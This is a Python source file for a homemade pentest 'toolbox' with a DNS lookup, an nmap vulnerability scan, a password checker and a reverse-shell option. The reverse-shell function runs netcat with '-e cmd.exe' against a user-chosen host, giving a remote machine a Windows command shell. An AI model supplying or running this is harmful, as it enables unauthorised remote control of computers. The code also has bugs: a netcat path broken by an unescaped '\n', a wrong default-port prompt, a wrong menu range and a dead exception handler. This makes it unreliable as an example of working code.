# Welcome to The Generoso SDV-toolbox

# Auto-reporting into the logs.txt
import sys
import datetime

class DualWriter:
    def __init__(self, *writers):
        self.writers = writers

    def write(self, text):
        for w in self.writers:
            w.write(text)

    def flush(self):
        for w in self.writers:
            w.flush()

def log_to_file(function):
    def wrapper(*args, **kwargs):
        original_stdout = sys.stdout
        with open('logs.txt', 'a', encoding='utf-8') as f:
            # Write date & time before execution
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f'\n[{timestamp}] Execution of {function.__name__}\n')
            # Double wirte in prompt & in the log file
            sys.stdout = DualWriter(f, original_stdout)
            result = function(*args, **kwargs)
        sys.stdout = original_stdout
        return result
    return wrapper

# The menu
import socket
import subprocess
import dns.resolver
import time

# Displaying the menu structure
def afficher_menu():
    print("╔══════════════════════════════════════╗")
    print("║       The Generoso SDV-toolbox       ║")
    print("║                                      ║")
    print("║               Main menu              ║")
    print("╠══════════════════════════════════════╣")
    print("║ Functions :                          ║")
    print("║  1. Domain check-up                  ║")
    print("║  2. Vulnerability scan               ║")
    print("║  3. Reverse Shell                    ║")
    print("║                                      ║")
    print("║ Extra :                              ║")
    print("║  4. Password analyzer                ║")
    print("╠══════════════════════════════════════╣")
    print("║  0. Exit                             ║")
    print("╚══════════════════════════════════════╝")

# Function to execute the menu
def executer_menu():
    while True:
        afficher_menu()
        choix = input("Choose an option: ")
        if choix == "1":
            nslookup()
        elif choix == "2":
            vuln_scan()
        elif choix == "3":
            reverse_shell()
        elif choix == "4":
            password_analyzer()
        elif choix == "0":
            print("════════════════════════════════════════")
            print("Shutting down.....")
            time.sleep(3) 
            break
        else:
            print("Error! Please enter a number between 0 and 5: ")

# Option 1: Domain information with DNSPython
@log_to_file
def nslookup():
    print("╔════════════════════════════╗")
    print("║ Option 1 : Domain check-up ║")
    print("╚════════════════════════════╝")
    target = input("Enter a domain name: ")
    resolver = dns.resolver.Resolver()
    resolver.timeout = 10
    resolver.lifetime = 10
    resolver.nameservers = ['8.8.8.8']

    try:
        # Displaying IP Address from the domain
        ip_address = socket.gethostbyname(target)
        print(f"The IP address of {target} is {ip_address}")

        # Get DNS 
        ns_records = resolver.resolve(target, 'NS')
        print("- DNS: ")
        for ns in ns_records:
            print(ns.target)

        # MX Records
        mx_records = resolver.resolve(target, 'MX')
        print("- MX records: ")
        for mx in mx_records:
            print(f'{mx.exchange} has a priority of {mx.preference}')

        # TXT Records
        txt_records = resolver.resolve(target, 'TXT')
        print("- TXT records: ")
        for txt in txt_records:
            print(txt.strings)

    # Error
    except socket.gaierror as e:
        print(f"Error when searching for domain name {target}: {e} ")
    except dns.resolver.NoAnswer as e:
        print(f"No answer for {target}: {e} ")
    except Exception as e:
        print(f"An error has occurred: {e} ")

# Option 2: Port and service scanning + nmap script
@log_to_file
def vuln_scan():
    print("╔═══════════════════════════════╗")
    print("║ Option 2 : Vulnerability scan ║")
    print("╚═══════════════════════════════╝")
    print("Enter the IP address or domain to scan: ")
    cible = input("-> ")
   
    # Attack mode
    attaque = input("Enter the attack level from 0 to 5 (default 3): ")
    if not attaque:
        attaque = "3"
   
    # Choose the ports
    debut_port = input("Enter the first port to scan (default 1): ")
    if not debut_port:
        debut_port = "1"
    fin_port = input("Enter the last port to scan (default 1): ")
    if not fin_port:
        fin_port = "1000"
   
    # Nmap command
    commande_nmap = ["nmap", "-Pn", f"-T{attaque}", f"-p{debut_port}-{fin_port}", "-sV", "--script=vuln", cible]
   
    try:
        resultat = subprocess.run(commande_nmap, capture_output=True, text=True, check=True)
        
        print(resultat.stdout)
    except subprocess.CalledProcessError as e:
       
        # Error
        print("Error executing Nmap command:", e)

# Option 3: Create a reverse shell with netcat
@log_to_file
def reverse_shell():
    print("╔══════════════════════════╗")
    print("║ Option 3 : Reverse shell ║")
    print("╚══════════════════════════╝")
    print("Enter the IP address of the host to listen to: ")
    ip_hôte = input("-> ")
    port = input("Enter the port number to listen to (default 4321): ")
    if not port:
        port = "4321"
   
    # Full path to the netcat executable (TO CUSTOMIZE)
    chemin_netcat = "C:\netcat-win32-1.12\nc.exe"  
   
    # Netcat command
    commande_netcat = f"{chemin_netcat} -e cmd.exe {ip_hôte} {port}"

    try:
        resultat = subprocess.run(commande_netcat, shell=True)
        commentaire = """--->> If the returncode is 0, the connection has been made <<---"""
        print(resultat)
        print(commentaire)
    except subprocess.CalledProcessError as e:
       
        # Error
        print("Error executing netcat command:", e)

# Extra: Password analyzer
@log_to_file
def password_analyzer():
    print("╔═══════════════════════════╗")
    print("║ Extra : Password analyzer ║")
    print("╚═══════════════════════════╝")
    password = input("Enter a password: ")
    result = analyse_password_processus(password)
    print(result)

# Process for executing password analysis
def analyse_password_processus(password):

    # List of common passwords (CUSTOMIZE AS NEEDED)
    password_commun = ["password", "123456", "qwerty", "azertyuiop", "root"]
    if password.lower() in password_commun:
        return "The password is commonly used"
        
    # Check password length
    if len(password) < 8:
        return "Password too short, please use at least 8 characters"
    
    # Check for upper and lower case letters in password
    if password.lower() == password or password.upper() == password:
        return "Password must contain upper and lower case letters"
    
    # Check for at least one special character in the password
    special_car = "!@#$%^&*()_+[]{}|;:,.<>?~"
    if not any(char in special_car for char in password):
        return "The password must contain at least one special character"
        
    # Return strong password status if all checks are passed
    return "Password is strong!"

# Execution of the menu
if __name__ == "__main__":
    executer_menu()